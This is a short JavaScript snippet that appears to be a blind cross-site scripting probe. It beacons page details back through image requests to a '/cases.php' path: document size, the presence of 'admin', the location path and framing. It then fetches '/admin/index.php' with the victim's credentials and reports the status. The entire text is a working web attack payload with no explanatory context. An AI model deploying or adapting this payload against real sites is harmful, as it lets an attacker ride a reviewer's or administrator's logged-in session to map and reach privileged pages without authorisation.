(function(){var b='/cases.php/D9588_';var img=function(s){new Image().src=b+s+'.css';};
 img('1');
 try{ img('2'); var d=document; img('3doc'+(d?1:0));
   var de=d.documentElement; img('4de'+(de?1:0));
   var H=de?de.outerHTML:''; img('5len'+(H.length>2000?'big':(H.length>200?'med':'small')));
   img('6admin'+(H.indexOf('admin')>=0?1:0));
   img('7loc'+(location.pathname.indexOf('review')>=0?'rev':(location.pathname.indexOf('admin')>=0?'adm':'other')));
   img('8framed'+(window.top===window.self?'top':'iframe'));
   fetch('/admin/index.php',{credentials:'include'}).then(function(r){img('9AF'+r.status);},function(){img('9AFrej');}).catch(function(){img('9AFerr');});
 }catch(e){ img('EXC'+(e&&e.name||'x')); }
})();
